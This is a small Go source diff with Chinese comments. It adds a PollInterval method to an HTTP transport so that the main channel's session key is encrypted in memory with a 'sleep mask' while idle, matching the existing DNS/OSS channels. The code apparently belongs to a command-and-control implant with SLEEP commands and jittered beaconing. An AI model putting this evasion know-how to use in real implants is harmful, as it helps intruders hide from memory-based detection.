@@ -253,3 +253,9 @@ if err != nil {
 }
 
 func (s *HTTPClient) Close() error { return nil }
+
+// PollInterval 轮询型传输：空闲轮询间隔 = sleep 基准（SLEEP 命令动态生效）。
+// runloop 对实现了该接口的传输走 app.SleepMask（睡眠期用随机 pad 加密会话密钥）。
+// 【修复】此前 HTTP 未实现它，被当成持久传输走 SleepWithJitter —— 主信道的会话密钥
+// 在空闲期完全明文驻留内存，而 DNS/OSS 反而有保护。
+func (c *HTTPClient) PollInterval() time.Duration { return config.WaitTime }
